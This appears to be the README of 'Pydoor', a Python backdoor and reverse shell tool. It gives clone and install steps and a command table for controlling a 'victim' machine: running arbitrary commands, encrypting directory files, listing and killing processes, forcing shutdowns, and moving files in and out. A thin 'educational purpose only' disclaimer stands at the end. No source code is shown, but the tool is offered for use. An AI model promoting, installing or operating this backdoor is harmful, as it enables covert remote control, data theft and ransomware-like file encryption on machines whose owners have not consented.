# Pydoor
A Simple backdoor/reverse shell program built in Python
<br>
### Instalation :

$ git clone https://github.com/Abthon/Pydoor.git
<br>
### Requirements :

<pre>
sudo pip install -r requirements.txt
</pre>

## Features

* Executing all linux commands (eg: ifconfig, ls, cd, pwd, & many more)
* encrypt diractory level files 
* Get systemInfo of the victim machine
* see a list of all background processes
* Kill process by name
* shutdown,logout & restart a victim machine
* Upload files to target(victim) machine
* Download files from the target(victim) machine

## Command Usage

1) shutdown [ usage ] -> shutdown
2) restart  [ usage ] -> restart
3) logout   [ usage ] -> logout
4) download [ usage ] -> download + fileName
5) upload   [ usage ] -> upload + fileName
6) kill     [ usage ] -> kill chromium   -> kill + processName
7) bgps     [ usage ] -> bgps --> for listing all background processes
8) sysinfo  [ usage ] -> sysinfo --> for getting system's info
9) exit     [ usage ] -> exit --> for safely exiting the program
10) encrypt [ usage ] -> encrypt --> Commnd for encrypting directory level files

<br>

### Contact :
<ul>
  <li> Email : walelignabenezer@gmail.com</li>
</ul>


### Disclaimer

* This program is to be used for educational purpose only. I take no responsibility or liability for own personal use.
